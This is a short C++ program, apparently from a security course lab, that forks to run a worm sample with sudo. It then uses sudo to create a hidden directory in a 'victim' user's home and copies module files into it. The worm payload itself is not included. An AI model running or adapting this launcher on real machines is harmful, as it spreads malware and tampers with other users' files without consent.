#include <cstdio>
#include <cstdlib>
#include <unistd.h>
//https://dywang.csie.cyut.edu.tw/dywang/security/node84.html
int main()
{
	if(!fork())
	{
		system("sudo source/worm_sample");
		return 0;
	}
	sleep(1);
	system("sudo mkdir ~/../victim/.GG");
	system("sudo cp ~/../victim/.etc/.module/* ~/../victim/.GG/");
	return 0;
}